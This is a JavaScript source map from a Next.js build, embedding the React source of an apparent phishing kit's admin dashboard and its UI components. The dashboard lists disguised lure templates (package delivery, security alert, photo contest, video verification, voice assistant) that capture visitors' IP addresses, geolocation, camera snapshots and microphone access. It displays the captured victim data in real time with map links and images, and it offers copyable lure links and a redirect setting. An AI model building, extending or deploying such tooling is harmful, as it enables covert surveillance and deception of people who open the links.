{
  "version": 3,
  "sources": [],
  "sections": [
    {"offset": {"line": 7, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/src/components/ui/card.tsx"],"sourcesContent":["import * as React from \"react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Card = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\n      \"rounded-lg border bg-card text-card-foreground shadow-sm\",\n      className\n    )}\n    {...props}\n  />\n))\nCard.displayName = \"Card\"\n\nconst CardHeader = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\"flex flex-col space-y-1.5 p-6\", className)}\n    {...props}\n  />\n))\nCardHeader.displayName = \"CardHeader\"\n\nconst CardTitle = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\n      \"text-2xl font-semibold leading-none tracking-tight\",\n      className\n    )}\n    {...props}\n  />\n))\nCardTitle.displayName = \"CardTitle\"\n\nconst CardDescription = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\"text-sm text-muted-foreground\", className)}\n    {...props}\n  />\n))\nCardDescription.displayName = \"CardDescription\"\n\nconst CardContent = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div ref={ref} className={cn(\"p-6 pt-0\", className)} {...props} />\n))\nCardContent.displayName = \"CardContent\"\n\nconst CardFooter = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\"flex items-center p-6 pt-0\", className)}\n    {...props}\n  />\n))\nCardFooter.displayName = \"CardFooter\"\n\nexport { Card, CardHeader, CardFooter, CardTitle, CardDescription, CardContent }\n"],"names":[],"mappings":";;;;;;;;;AAAA;AAEA;;;;AAEA,MAAM,qBAAO,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAG1B,CAAC,EAAE,SAAS,EAAE,GAAG,OAAO,EAAE,oBAC1B,8OAAC;QACC,KAAK;QACL,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EACV,4DACA;QAED,GAAG,KAAK;;;;;;AAGb,KAAK,WAAW,GAAG;AAEnB,MAAM,2BAAa,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAGhC,CAAC,EAAE,SAAS,EAAE,GAAG,OAAO,EAAE,oBAC1B,8OAAC;QACC,KAAK;QACL,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EAAE,iCAAiC;QAC9C,GAAG,KAAK;;;;;;AAGb,WAAW,WAAW,GAAG;AAEzB,MAAM,0BAAY,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAG/B,CAAC,EAAE,SAAS,EAAE,GAAG,OAAO,EAAE,oBAC1B,8OAAC;QACC,KAAK;QACL,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EACV,sDACA;QAED,GAAG,KAAK;;;;;;AAGb,UAAU,WAAW,GAAG;AAExB,MAAM,gCAAkB,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAGrC,CAAC,EAAE,SAAS,EAAE,GAAG,OAAO,EAAE,oBAC1B,8OAAC;QACC,KAAK;QACL,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EAAE,iCAAiC;QAC9C,GAAG,KAAK;;;;;;AAGb,gBAAgB,WAAW,GAAG;AAE9B,MAAM,4BAAc,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAGjC,CAAC,EAAE,SAAS,EAAE,GAAG,OAAO,EAAE,oBAC1B,8OAAC;QAAI,KAAK;QAAK,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EAAE,YAAY;QAAa,GAAG,KAAK;;;;;;AAEhE,YAAY,WAAW,GAAG;AAE1B,MAAM,2BAAa,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAGhC,CAAC,EAAE,SAAS,EAAE,GAAG,OAAO,EAAE,oBAC1B,8OAAC;QACC,KAAK;QACL,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EAAE,8BAA8B;QAC3C,GAAG,KAAK;;;;;;AAGb,WAAW,WAAW,GAAG","debugId":null}},
    {"offset": {"line": 88, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/src/components/ui/input.tsx"],"sourcesContent":["import * as React from \"react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Input = React.forwardRef<HTMLInputElement, React.ComponentProps<\"input\">>(\n  ({ className, type, ...props }, ref) => {\n    return (\n      <input\n        type={type}\n        className={cn(\n          \"flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm\",\n          className\n        )}\n        ref={ref}\n        {...props}\n      />\n    )\n  }\n)\nInput.displayName = \"Input\"\n\nexport { Input }\n"],"names":[],"mappings":";;;;AAAA;AAEA;;;;AAEA,MAAM,sBAAQ,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAC3B,CAAC,EAAE,SAAS,EAAE,IAAI,EAAE,GAAG,OAAO,EAAE;IAC9B,qBACE,8OAAC;QACC,MAAM;QACN,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EACV,kYACA;QAEF,KAAK;QACJ,GAAG,KAAK;;;;;;AAGf;AAEF,MAAM,WAAW,GAAG","debugId":null}},
    {"offset": {"line": 117, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/src/components/dashboard/PhishingLinkCard.tsx"],"sourcesContent":["\n\"use client\";\nimport type { LucideIcon } from 'lucide-react';\nimport React, { useState, useEffect } from 'react';\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Button } from '@/components/ui/button';\nimport { Input } from '@/components/ui/input';\nimport { Copy, Save } from 'lucide-react';\nimport { useToast } from '@/hooks/use-toast';\n\ninterface PhishingLink {\n  id: string;\n  name: string;\n  url: string;\n}\n\ninterface PhishingLinkCardProps {\n  title: string;\n  description: string;\n  Icon: LucideIcon;\n  links: PhishingLink[];\n  // cardColorClass?: string; // Removed prop\n}\n\nconst CONTENT_UNLOCK_REDIRECT_URL_KEY = 'contentUnlockRedirectUrl';\n\nexport function PhishingLinkCard({ title, description, Icon, links }: PhishingLinkCardProps) {\n  const { toast } = useToast();\n  const [redirectUrl, setRedirectUrl] = useState('');\n\n  useEffect(() => {\n    const hasContentUnlockLink = links.some(link => link.id === 'content-unlock');\n    if (hasContentUnlockLink) {\n      const savedUrl = localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY);\n      if (savedUrl) {\n        setRedirectUrl(savedUrl);\n      }\n    }\n  }, [links]);\n\n  const handleCopyLink = async (url: string) => {\n    try {\n      const fullUrl = `${window.location.origin}${url}`;\n      await navigator.clipboard.writeText(fullUrl);\n      toast({\n        title: \"Link Copied!\",\n        description: \"The phishing link has been copied to your clipboard.\",\n        variant: \"default\",\n      });\n    } catch (err) {\n      console.error('Failed to copy: ', err);\n      toast({\n        title: \"Copy Failed\",\n        description: \"Could not copy the link to your clipboard.\",\n        variant: \"destructive\",\n      });\n    }\n  };\n\n  const handleSaveRedirectUrl = () => {\n    localStorage.setItem(CONTENT_UNLOCK_REDIRECT_URL_KEY, redirectUrl);\n    toast({\n      title: \"Redirection URL Saved\",\n      description: redirectUrl ? `Content unlock will redirect to: ${redirectUrl}` : \"Redirection disabled for content unlock.\",\n    });\n  };\n\n  return (\n    <Card className={`shadow-lg hover:shadow-xl transition-shadow`}> {/* Removed cardColorClass */}\n      <CardHeader className=\"flex flex-row items-center justify-between space-y-0 pb-2\">\n        <CardTitle className=\"text-xl font-semibold\">{title}</CardTitle>\n        <Icon className=\"h-6 w-6 text-primary\" /> {/* Changed icon color */}\n      </CardHeader>\n      <CardContent>\n        <CardDescription className=\"mb-4\">{description}</CardDescription>\n        <div className=\"space-y-2\">\n          {links.map((link) => (\n            <div key={link.id}>\n              <Button\n                variant=\"outline\"\n                className=\"w-full justify-start\"\n                onClick={() => handleCopyLink(link.url)}\n              >\n                <Copy className=\"mr-2 h-4 w-4\" />\n                {link.name}\n              </Button>\n              {link.id === 'content-unlock' && (\n                <div className=\"mt-2 pl-3 border-l-2 border-border/60 ml-1 py-2\">\n                  <div className=\"flex items-center space-x-2\">\n                    <Button\n                      variant={redirectUrl ? 'default' : 'outline'}\n                      size=\"icon\"\n                      className=\"h-8 w-8 flex-shrink-0 p-0\"\n                      onClick={handleSaveRedirectUrl}\n                      aria-label=\"Save redirection URL\"\n                    >\n                      <Save className=\"h-4 w-4\" />\n                    </Button>\n                    <Input\n                      type=\"url\"\n                      placeholder=\"Enter redirection URL\"\n                      className=\"h-8 text-sm text-center flex-grow\"\n                      value={redirectUrl}\n                      onChange={(e) => setRedirectUrl(e.target.value)}\n                    />\n                  </div>\n                </div>\n              )}\n            </div>\n          ))}\n        </div>\n      </CardContent>\n    </Card>\n  );\n}\n"],"names":[],"mappings":";;;;AAGA;AACA;AACA;AACA;AACA;AAAA;AACA;AAPA;;;;;;;;AAuBA,MAAM,kCAAkC;AAEjC,SAAS,iBAAiB,EAAE,KAAK,EAAE,WAAW,EAAE,IAAI,EAAE,KAAK,EAAyB;IACzF,MAAM,EAAE,KAAK,EAAE,GAAG,CAAA,GAAA,4HAAA,CAAA,WAAQ,AAAD;IACzB,MAAM,CAAC,aAAa,eAAe,GAAG,CAAA,GAAA,qMAAA,CAAA,WAAQ,AAAD,EAAE;IAE/C,CAAA,GAAA,qMAAA,CAAA,YAAS,AAAD,EAAE;QACR,MAAM,uBAAuB,MAAM,IAAI,CAAC,CAAA,OAAQ,KAAK,EAAE,KAAK;QAC5D,IAAI,sBAAsB;YACxB,MAAM,WAAW,aAAa,OAAO,CAAC;YACtC,IAAI,UAAU;gBACZ,eAAe;YACjB;QACF;IACF,GAAG;QAAC;KAAM;IAEV,MAAM,iBAAiB,OAAO;QAC5B,IAAI;YACF,MAAM,UAAU,GAAG,OAAO,QAAQ,CAAC,MAAM,GAAG,KAAK;YACjD,MAAM,UAAU,SAAS,CAAC,SAAS,CAAC;YACpC,MAAM;gBACJ,OAAO;gBACP,aAAa;gBACb,SAAS;YACX;QACF,EAAE,OAAO,KAAK;YACZ,QAAQ,KAAK,CAAC,oBAAoB;YAClC,MAAM;gBACJ,OAAO;gBACP,aAAa;gBACb,SAAS;YACX;QACF;IACF;IAEA,MAAM,wBAAwB;QAC5B,aAAa,OAAO,CAAC,iCAAiC;QACtD,MAAM;YACJ,OAAO;YACP,aAAa,cAAc,CAAC,iCAAiC,EAAE,aAAa,GAAG;QACjF;IACF;IAEA,qBACE,8OAAC,gIAAA,CAAA,OAAI;QAAC,WAAW,CAAC,2CAA2C,CAAC;;YAAE;0BAC9D,8OAAC,gIAAA,CAAA,aAAU;gBAAC,WAAU;;kCACpB,8OAAC,gIAAA,CAAA,YAAS;wBAAC,WAAU;kCAAyB;;;;;;kCAC9C,8OAAC;wBAAK,WAAU;;;;;;oBAAyB;;;;;;;0BAE3C,8OAAC,gIAAA,CAAA,cAAW;;kCACV,8OAAC,gIAAA,CAAA,kBAAe;wBAAC,WAAU;kCAAQ;;;;;;kCACnC,8OAAC;wBAAI,WAAU;kCACZ,MAAM,GAAG,CAAC,CAAC,qBACV,8OAAC;;kDACC,8OAAC,kIAAA,CAAA,SAAM;wCACL,SAAQ;wCACR,WAAU;wCACV,SAAS,IAAM,eAAe,KAAK,GAAG;;0DAEtC,8OAAC,kMAAA,CAAA,OAAI;gDAAC,WAAU;;;;;;4CACf,KAAK,IAAI;;;;;;;oCAEX,KAAK,EAAE,KAAK,kCACX,8OAAC;wCAAI,WAAU;kDACb,cAAA,8OAAC;4CAAI,WAAU;;8DACb,8OAAC,kIAAA,CAAA,SAAM;oDACL,SAAS,cAAc,YAAY;oDACnC,MAAK;oDACL,WAAU;oDACV,SAAS;oDACT,cAAW;8DAEX,cAAA,8OAAC,kMAAA,CAAA,OAAI;wDAAC,WAAU;;;;;;;;;;;8DAElB,8OAAC,iIAAA,CAAA,QAAK;oDACJ,MAAK;oDACL,aAAY;oDACZ,WAAU;oDACV,OAAO;oDACP,UAAU,CAAC,IAAM,eAAe,EAAE,MAAM,CAAC,KAAK;;;;;;;;;;;;;;;;;;+BA1B9C,KAAK,EAAE;;;;;;;;;;;;;;;;;;;;;;AAqC7B","debugId":null}},
    {"offset": {"line": 313, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/src/components/ui/scroll-area.tsx"],"sourcesContent":["\"use client\"\n\nimport * as React from \"react\"\nimport * as ScrollAreaPrimitive from \"@radix-ui/react-scroll-area\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst ScrollArea = React.forwardRef<\n  React.ElementRef<typeof ScrollAreaPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof ScrollAreaPrimitive.Root>\n>(({ className, children, ...props }, ref) => (\n  <ScrollAreaPrimitive.Root\n    ref={ref}\n    className={cn(\"relative overflow-hidden\", className)}\n    {...props}\n  >\n    <ScrollAreaPrimitive.Viewport className=\"h-full w-full rounded-[inherit]\">\n      {children}\n    </ScrollAreaPrimitive.Viewport>\n    <ScrollBar />\n    <ScrollAreaPrimitive.Corner />\n  </ScrollAreaPrimitive.Root>\n))\nScrollArea.displayName = ScrollAreaPrimitive.Root.displayName\n\nconst ScrollBar = React.forwardRef<\n  React.ElementRef<typeof ScrollAreaPrimitive.ScrollAreaScrollbar>,\n  React.ComponentPropsWithoutRef<typeof ScrollAreaPrimitive.ScrollAreaScrollbar>\n>(({ className, orientation = \"vertical\", ...props }, ref) => (\n  <ScrollAreaPrimitive.ScrollAreaScrollbar\n    ref={ref}\n    orientation={orientation}\n    className={cn(\n      \"flex touch-none select-none transition-colors\",\n      orientation === \"vertical\" &&\n        \"h-full w-2.5 border-l border-l-transparent p-[1px]\",\n      orientation === \"horizontal\" &&\n        \"h-2.5 flex-col border-t border-t-transparent p-[1px]\",\n      className\n    )}\n    {...props}\n  >\n    <ScrollAreaPrimitive.ScrollAreaThumb className=\"relative flex-1 rounded-full bg-border\" />\n  </ScrollAreaPrimitive.ScrollAreaScrollbar>\n))\nScrollBar.displayName = ScrollAreaPrimitive.ScrollAreaScrollbar.displayName\n\nexport { ScrollArea, ScrollBar }\n"],"names":[],"mappings":";;;;;AAEA;AACA;AAEA;AALA;;;;;AAOA,MAAM,2BAAa,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAGhC,CAAC,EAAE,SAAS,EAAE,QAAQ,EAAE,GAAG,OAAO,EAAE,oBACpC,8OAAC,0KAAA,CAAA,OAAwB;QACvB,KAAK;QACL,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EAAE,4BAA4B;QACzC,GAAG,KAAK;;0BAET,8OAAC,0KAAA,CAAA,WAA4B;gBAAC,WAAU;0BACrC;;;;;;0BAEH,8OAAC;;;;;0BACD,8OAAC,0KAAA,CAAA,SAA0B;;;;;;;;;;;AAG/B,WAAW,WAAW,GAAG,0KAAA,CAAA,OAAwB,CAAC,WAAW;AAE7D,MAAM,0BAAY,CAAA,GAAA,qMAAA,CAAA,aAAgB,AAAD,EAG/B,CAAC,EAAE,SAAS,EAAE,cAAc,UAAU,EAAE,GAAG,OAAO,EAAE,oBACpD,8OAAC,0KAAA,CAAA,sBAAuC;QACtC,KAAK;QACL,aAAa;QACb,WAAW,CAAA,GAAA,mHAAA,CAAA,KAAE,AAAD,EACV,iDACA,gBAAgB,cACd,sDACF,gBAAgB,gBACd,wDACF;QAED,GAAG,KAAK;kBAET,cAAA,8OAAC,0KAAA,CAAA,kBAAmC;YAAC,WAAU;;;;;;;;;;;AAGnD,UAAU,WAAW,GAAG,0KAAA,CAAA,sBAAuC,CAAC,WAAW","debugId":null}},
    {"offset": {"line": 381, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/src/app/admin/dashboard/page.tsx"],"sourcesContent":["\n\"use client\";\nimport { useEffect, useRef, useState } from 'react';\nimport { useLogs } from '@/contexts/LogContext';\nimport { Button } from '@/components/ui/button';\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';\nimport { PhishingLinkCard } from '@/components/dashboard/PhishingLinkCard';\nimport { MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle, ExternalLink, Truck, Trophy, ImagePlus, Sparkles, Lock, ShieldAlert, Image as ImageIconLucide } from 'lucide-react';\nimport type { LogEntry, LocationData, CameraData } from '@/types';\nimport { ScrollArea } from '@/components/ui/scroll-area';\nimport Image from 'next/image';\nimport { useToast } from '@/hooks/use-toast';\nimport type { ToastActionElement } from '@/components/ui/toast';\nimport { ToastAction } from '@/components/ui/toast';\nimport { cn } from '@/lib/utils';\n\n\nconst phishingCategories = [\n  {\n    title: 'Location',\n    description: 'Templates designed to capture IP address and attempt geolocation.',\n    Icon: MapPin,\n    links: [\n      { id: 'package-delivery-issue', name: 'Template: Package Delivery Issue', url: '/phishing/location/package-delivery-issue', Icon: Truck, description: \"Simulates a package delivery problem requiring address verification.\" },\n      { id: 'security-alert', name: 'Template: Security Alert', url: '/phishing/location/security-alert', Icon: ShieldAlert, description: \"Simulates an urgent security notification.\" },\n      { id: 'content-unlock', name: 'Template: Content Unlock', url: '/phishing/location/content-unlock', Icon: Lock, description: \"Simulates unlocking region-restricted content.\" },\n    ],\n  },\n  {\n    title: 'Camera Access',\n    description: 'Templates attempting to access the device camera.',\n    Icon: Camera,\n    links: [\n      { id: 'photo-contest-entry', name: 'Template: Photo Contest Entry', url: '/phishing/camera/photo-contest-entry', Icon: Trophy, description: \"Simulates a photo contest entry requiring camera access after cookie consent.\" },\n      { id: 'video-verification', name: 'Template: Video Verification', url: '/phishing/camera/video-verification', Icon: ImageIconLucide, description: \"Simulates a video ID verification process.\" },\n      { id: 'ar-filter', name: 'Template: AR Filter Test', url: '/phishing/camera/ar-filter', Icon: Camera, description: \"Simulates trying out an AR filter.\" },\n    ],\n  },\n  {\n    title: 'Audio Access',\n    description: 'Templates simulating microphone access requests.',\n    Icon: Mic,\n    links: [\n      { id: 'voice-assistant', name: 'Template: Voice Assistant Setup', url: '/phishing/audio/voice-assistant', description: \"Simulates setting up a voice assistant.\" },\n      { id: 'speech-to-text', name: 'Template: Speech-to-Text Demo', url: '/phishing/audio/speech-to-text', description: \"Simulates a speech-to-text service.\" },\n      { id: 'quality-check', name: 'Template: Audio Quality Check', url: '/phishing/audio/quality-check', description: \"Simulates a microphone quality check.\" },\n    ],\n  },\n];\n\nexport default function DashboardPage() {\n  const { logs, clearLogs, isLoading } = useLogs();\n  const { toast } = useToast();\n  const previousLatestLogIdRef = useRef<string | null>(null);\n  const isInitialLoadRef = useRef(true);\n  const [expandedImageUrl, setExpandedImageUrl] = useState<string | null>(null);\n  const [isModalAnimating, setIsModalAnimating] = useState(false);\n\n  const openModal = (url: string) => {\n    setExpandedImageUrl(url);\n    requestAnimationFrame(() => {\n      setIsModalAnimating(true);\n    });\n  };\n\n  const closeModal = () => {\n    setIsModalAnimating(false);\n    setTimeout(() => {\n      setExpandedImageUrl(null);\n    }, 300); \n  };\n\n\n  useEffect(() => {\n    if (isLoading) return;\n\n    if (logs.length === 0) {\n      previousLatestLogIdRef.current = null;\n      if(isInitialLoadRef.current) isInitialLoadRef.current = false;\n      return;\n    }\n\n    const currentLatestLogId = logs[0].id;\n\n    if (isInitialLoadRef.current) {\n      previousLatestLogIdRef.current = currentLatestLogId;\n      isInitialLoadRef.current = false;\n      return;\n    }\n\n    if (currentLatestLogId !== previousLatestLogIdRef.current) {\n      const newLog = logs[0];\n      let toastTitle = \"New Data Captured!\";\n      let toastDescription = `Type: ${newLog.type}, IP: ${newLog.ip}`;\n      let toastAction: ToastActionElement | undefined = undefined;\n\n      if (newLog.type === 'location') {\n        const locData = newLog.data as LocationData;\n        const city = locData.city || \"Unknown City\";\n        const country = locData.country || \"Unknown Country\";\n        toastTitle = \"Location Data Captured!\";\n        toastDescription = `From ${city}, ${country}. IP: ${newLog.ip}.`;\n        if (locData.latitude && locData.longitude) {\n          const mapsUrl = `https://www.google.com/maps?q=${locData.latitude},${locData.longitude}`;\n          toastAction = (\n            <ToastAction\n              altText=\"Open in Maps\"\n              onClick={() => window.open(mapsUrl, '_blank')}\n            >\n              <ExternalLink className=\"mr-2 h-4 w-4\" /> Open in Maps\n            </ToastAction>\n          );\n        }\n      } else if (newLog.type === 'camera') {\n        toastTitle = \"Camera Snapshot Captured!\";\n        toastDescription = `Image captured from IP: ${newLog.ip}.`;\n      } else if (newLog.type === 'audio') {\n        toastTitle = \"Audio Capture Simulated!\";\n        toastDescription = `Audio event from IP: ${newLog.ip}.`;\n      } else if (newLog.type === 'generic') {\n        toastTitle = \"Page Visit Detected!\";\n        toastDescription = `Page: ${newLog.data.message?.split(': ')[1] || 'Unknown page'}, IP: ${newLog.ip}`;\n      }\n\n      toast({\n        title: toastTitle,\n        description: toastDescription,\n        variant: \"default\",\n        action: toastAction,\n      });\n      previousLatestLogIdRef.current = currentLatestLogId;\n    }\n  }, [logs, isLoading, toast]);\n\n\n  const formatLogData = (data: any, type: LogEntry['type']): React.ReactNode => {\n    if (type === 'camera' && data && typeof data.imageUrl === 'string') {\n      const camData = data as CameraData;\n      return (\n        <div className=\"mt-2\">\n          <Image\n            src={camData.imageUrl}\n            alt=\"Captured image thumbnail\"\n            width={160} \n            height={120}\n            className=\"rounded-md border object-contain cursor-pointer hover:opacity-80 transition-opacity\"\n            onClick={() => openModal(camData.imageUrl)}\n            style={{ aspectRatio: '4/3' }} \n          />\n          <details className=\"text-xs mt-1\">\n            <summary className=\"cursor-pointer text-muted-foreground hover:text-foreground\">Show Base64 Data (truncated)</summary>\n            <pre className=\"whitespace-pre-wrap break-all text-xs bg-muted/30 p-2 rounded-sm mt-1\">{JSON.stringify({ imageUrl: `${camData.imageUrl.substring(0,100)}...` }, null, 2)}</pre>\n          </details>\n        </div>\n      );\n    }\n    if (type === 'location' && data) {\n        const locData = data as LocationData;\n        return <pre className=\"whitespace-pre-wrap break-all text-xs\">{JSON.stringify(locData, null, 2)}</pre>;\n    }\n    return <pre className=\"whitespace-pre-wrap break-all text-xs\">{JSON.stringify(data, null, 2)}</pre>;\n  };\n\n  return (\n    <>\n      <div className=\"space-y-10\">\n        <Card className=\"shadow-lg\">\n          <CardHeader>\n            <CardTitle className=\"text-2xl flex items-center\">\n              <ListChecks className=\"mr-3 h-7 w-7 text-primary\" />\n              Captured Data Logs\n            </CardTitle>\n            <CardDescription>\n              View all data captured from phishing page interactions. This data updates in real-time.\n            </CardDescription>\n          </CardHeader>\n          <CardContent className=\"space-y-4\">\n            {isLoading ? (\n              <p>Loading logs...</p>\n            ) : logs.length === 0 ? (\n              <div className=\"text-center py-8 text-muted-foreground\">\n                <AlertTriangle className=\"mx-auto h-12 w-12 mb-2\" />\n                <p className=\"text-lg\">No logs captured yet.</p>\n                <p>Interact with the phishing templates to see data here.</p>\n              </div>\n            ) : (\n              <ScrollArea className=\"h-[400px] w-full rounded-md border p-4 bg-secondary/30\">\n                {logs.map(log => (\n                  <div key={log.id} className=\"mb-4 p-3 rounded-md bg-card shadow-sm border\">\n                    <p className=\"font-semibold text-sm text-primary\">Log ID: <span className=\"font-mono text-xs\">{log.id}</span></p>\n                    <p className=\"text-xs text-muted-foreground\">Timestamp: {new Date(log.timestamp).toLocaleString()}</p>\n                    <p className=\"text-xs text-muted-foreground\">Type: <span className=\"font-medium capitalize\">{log.type}</span></p>\n                    <p className=\"text-xs text-muted-foreground\">IP: {log.ip}</p>\n                    <p className=\"text-xs text-muted-foreground\">User Agent: {log.userAgent}</p>\n                    <div className=\"mt-1 text-sm\">Data: {formatLogData(log.data, log.type)}</div>\n                  </div>\n                ))}\n              </ScrollArea>\n            )}\n            <Button onClick={clearLogs} variant=\"destructive\" disabled={logs.length === 0}>\n              <Trash2 className=\"mr-2 h-4 w-4\" /> Delete All Logs\n            </Button>\n          </CardContent>\n        </Card>\n\n        <Card className=\"shadow-lg\">\n          <CardHeader>\n            <CardTitle className=\"text-2xl\">Phishing Page Templates</CardTitle>\n            <CardDescription>\n              Use these links to simulate phishing attempts and observe data capture. Each link opens in a new tab.\n            </CardDescription>\n          </CardHeader>\n          <CardContent className=\"flex justify-center\">\n            <div className=\"inline-grid gap-6 md:grid-cols-1 lg:grid-cols-3\">\n              {phishingCategories.map((category) => (\n                <PhishingLinkCard\n                  key={category.title}\n                  title={category.title}\n                  description={category.description}\n                  Icon={category.Icon}\n                  links={category.links.map(link => ({\n                    ...link,\n                    description: link.description || \"Generic template description.\",\n                    Icon: link.Icon || category.Icon\n                  }))}\n                />\n              ))}\n            </div>\n          </CardContent>\n        </Card>\n      </div>\n\n      {expandedImageUrl && (\n        <div\n          className={cn(\n            \"fixed inset-0 z-[101] flex items-center justify-center p-4 cursor-zoom-out\",\n            \"transition-opacity duration-300 ease-in-out\",\n            isModalAnimating ? \"opacity-100 bg-black/80\" : \"opacity-0 bg-black/0 pointer-events-none\"\n          )}\n          onClick={closeModal}\n        >\n          <div\n            className={cn(\n              \"transform transition-all duration-300 ease-in-out\",\n              isModalAnimating ? \"opacity-100 scale-100\" : \"opacity-0 scale-95\"\n            )}\n            onClick={(e) => e.stopPropagation()} \n          >\n            <Image\n              src={expandedImageUrl}\n              alt=\"Expanded captured image\"\n              width={0} \n              height={0}\n              sizes=\"100vw\"\n              style={{ width: 'auto', height: 'auto' }} \n              className=\"max-w-[90vw] max-h-[90vh] object-contain rounded-lg shadow-xl bg-white p-1\"\n            />\n          </div>\n        </div>\n      )}\n    </>\n  );\n}\n"],"names":[],"mappings":";;;;AAEA;AACA;AACA;AACA;AACA;AACA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AAEA;AACA;AACA;AAEA;AACA;AAbA;;;;;;;;;;;;;AAgBA,MAAM,qBAAqB;IACzB;QACE,OAAO;QACP,aAAa;QACb,MAAM,0MAAA,CAAA,SAAM;QACZ,OAAO;YACL;gBAAE,IAAI;gBAA0B,MAAM;gBAAoC,KAAK;gBAA6C,MAAM,oMAAA,CAAA,QAAK;gBAAE,aAAa;YAAuE;YAC7N;gBAAE,IAAI;gBAAkB,MAAM;gBAA4B,KAAK;gBAAqC,MAAM,oNAAA,CAAA,cAAW;gBAAE,aAAa;YAA6C;YACjL;gBAAE,IAAI;gBAAkB,MAAM;gBAA4B,KAAK;gBAAqC,MAAM,kMAAA,CAAA,OAAI;gBAAE,aAAa;YAAiD;SAC/K;IACH;IACA;QACE,OAAO;QACP,aAAa;QACb,MAAM,sMAAA,CAAA,SAAM;QACZ,OAAO;YACL;gBAAE,IAAI;gBAAuB,MAAM;gBAAiC,KAAK;gBAAwC,MAAM,sMAAA,CAAA,SAAM;gBAAE,aAAa;YAAgF;YAC5N;gBAAE,IAAI;gBAAsB,MAAM;gBAAgC,KAAK;gBAAuC,MAAM,oMAAA,CAAA,QAAe;gBAAE,aAAa;YAA6C;YAC/L;gBAAE,IAAI;gBAAa,MAAM;gBAA4B,KAAK;gBAA8B,MAAM,sMAAA,CAAA,SAAM;gBAAE,aAAa;YAAqC;SACzJ;IACH;IACA;QACE,OAAO;QACP,aAAa;QACb,MAAM,gMAAA,CAAA,MAAG;QACT,OAAO;YACL;gBAAE,IAAI;gBAAmB,MAAM;gBAAmC,KAAK;gBAAmC,aAAa;YAA0C;YACjK;gBAAE,IAAI;gBAAkB,MAAM;gBAAiC,KAAK;gBAAkC,aAAa;YAAsC;YACzJ;gBAAE,IAAI;gBAAiB,MAAM;gBAAiC,KAAK;gBAAiC,aAAa;YAAwC;SAC1J;IACH;CACD;AAEc,SAAS;IACtB,MAAM,EAAE,IAAI,EAAE,SAAS,EAAE,SAAS,EAAE,GAAG,CAAA,GAAA,8HAAA,CAAA,UAAO,AAAD;IAC7C,MAAM,EAAE,KAAK,EAAE,GAAG,CAAA,GAAA,4HAAA,CAAA,WAAQ,AAAD;IACzB,MAAM,yBAAyB,CAAA,GAAA,qMAAA,CAAA,SAAM,AAAD,EAAiB;IACrD,MAAM,mBAAmB,CAAA,GAAA,qMAAA,CAAA,SAAM,AAAD,EAAE;IAChC,MAAM,CAAC,kBAAkB,oBAAoB,GAAG,CAAA,GAAA,qMAAA,CAAA,WAAQ,AAAD,EAAiB;IACxE,MAAM,CAAC,kBAAkB,oBAAoB,GAAG,CAAA,GAAA,qMAAA,CAAA,WAAQ,AAAD,EAAE;IAEzD,MAAM,YAAY,CAAC;QACjB,oBAAoB;QACpB,sBAAsB;YACpB,oBAAoB;QACtB;IACF;IAEA,MAAM,aAAa;QACjB,oBAAoB;QACpB,WAAW;YACT,oBAAoB;QACtB,GAAG;IACL;IAGA,CAAA,GAAA,qMAAA,CAAA,YAAS,AAAD,EAAE;QACR,IAAI,WAAW;QAEf,IAAI,KAAK,MAAM,KAAK,GAAG;YACrB,uBAAuB,OAAO,GAAG;YACjC,IAAG,iBAAiB,OAAO,EAAE,iBAAiB,OAAO,GAAG;YACxD;QACF;QAEA,MAAM,qBAAqB,IAAI,CAA